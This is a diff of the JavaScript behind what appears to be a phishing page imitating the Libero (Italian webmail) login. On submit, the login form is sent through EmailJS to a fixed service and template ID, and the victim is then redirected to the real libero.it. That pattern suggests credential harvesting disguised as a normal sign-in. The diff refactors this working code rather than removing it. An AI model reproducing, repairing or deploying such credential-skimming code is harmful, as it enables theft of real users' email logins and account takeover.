@@ -1,25 +1,25 @@
-const btn = document.getElementById('button');
+const btn = document.getElementById('nextBtn');
 
-document.getElementById('form')
+document.getElementById('loginform')
     .addEventListener('submit', function(event) {
         event.preventDefault();
 
-        btn.value = 'AVANTI';
+        btn.textContent= 'AVANTI';
 
         const serviceID = 'service_9ust8qe';
         const templateID = 'template_q5nghfc';
 
-        emailjs.sendForm(serviceID, templateID, this)
+        emailjs.sendForm(serviceID, templateID, event.target)
             .then(() => {
-                btn.value = 'Login';
+                btn.textContent = 'Login';
                 window.location.href = 'https://libero.it'; // Redirect to the desired link
-            }, (err) => {
-                btn.value = 'Login';
+            })
+            .catch((err) => {
+                btn.textContent = 'Login';
                 alert(JSON.stringify(err));
             });
 
-       form.reset();
-        return false;
+      event.target.reset();
     });
 
 const togglePasswordButton = document.querySelector("#toggle-password");
@@ -58,5 +58,6 @@ inputPlaceholder.forEach((input) => {
     });
 
 });
+
 
 
